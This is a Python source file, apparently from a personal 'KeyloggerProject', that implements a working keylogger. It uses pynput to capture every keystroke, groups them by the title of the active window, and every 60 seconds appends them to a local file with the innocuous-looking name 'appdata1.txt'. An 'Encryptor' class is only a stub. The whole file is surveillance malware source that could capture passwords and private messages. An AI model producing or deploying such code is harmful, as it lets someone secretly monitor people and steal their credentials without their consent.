from pynput import keyboard
import datetime
from abc import ABC,abstractmethod
from threading import Timer
import pygetwindow


class KeyloggerService:
    def __init__(self):
        self.logs = {}
        self.listener = None

    @staticmethod
    def get_active_window():
        try:
            return pygetwindow.getActiveWindowTitle()
        except (pygetwindow.PyGetWindowException, AttributeError):
            return "Unknown"

    def on_press(self, key):
        if key == keyboard.Key.alt_l:
            print(self.logs)
        if key == keyboard.Key.space:
            key = " "
        if key == keyboard.Key.enter:
            key = "\n"
        else:
            try:
                key = key.char
            except AttributeError:
                key = f" {str(key).replace("Key.","").upper()} "
        if self.get_active_window() not in self.logs:
            self.logs[self.get_active_window()] = key
        else:
            self.logs[self.get_active_window()] += key


    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False


    def clear_logs(self):
        self.logs = {}
        return self.logs


class Writer(ABC):
    @abstractmethod
    def writer(self,data):
        pass

class FileWriter(Writer):
    def __init__(self):
        self.path = r"C:\Users\st\KeyloggerProject\appdata1.txt"


    def writer(self,data):
        try:
            with open(self.path, "a") as logfile:
                if isinstance(data, dict):
                    for key in data:
                        logfile.write(f"\n--{key}--\n")
                        logfile.write("".join(data[key]))
                        logfile.write("\n")
                else:
                    logfile.write(f"\n{data}\n")
        except IOError:
            pass

class Encryptor:
    @staticmethod
    def encrypt(data):
        return data

    @staticmethod
    def decrypt(data):
        pass


class KeyloggerManager:
    def __init__(self):
        self.keylogger_service = KeyloggerService()
        self.filewriter = FileWriter()
        self.encryption = Encryptor()
        self.start_time = None
        self.timer = None
        self.listener = None


    @staticmethod
    def get_time():
        dt = datetime.datetime.now()
        return dt.strftime('***** %d/%m/%Y %H:%M *****')


    def save_data(self):
        if not self.keylogger_service.logs:
            return
        encrypt_data = self.encryption.encrypt(self.keylogger_service.logs)
        self.filewriter.writer(self.start_time)
        self.filewriter.writer(encrypt_data)
        self.keylogger_service.logs = self.keylogger_service.clear_logs()
        self.start_time = KeyloggerManager.get_time()
        self.timer = Timer(interval=60, function=self.save_data)
        self.timer.start()


    def start_logging(self):
        self.start_time = KeyloggerManager.get_time()
        # with keyboard.Listener(on_press=self.keylogger_service.on_press,on_release=self.keylogger_service.on_release) as self.listener:
        #     self.listener.join()
        self.listener = keyboard.Listener(on_press=self.keylogger_service.on_press,on_release=self.keylogger_service.on_release)
        self.listener.start()
        self.timer = Timer(interval=60,function=self.save_data)
        self.timer.start()


    def stop_logging(self):
        if self.timer:
            self.timer.cancel()
        if self.listener:
            self.listener.stop()
        self.save_data()







if __name__ == "__main__":
    test = KeyloggerManager()
    test.start_logging()








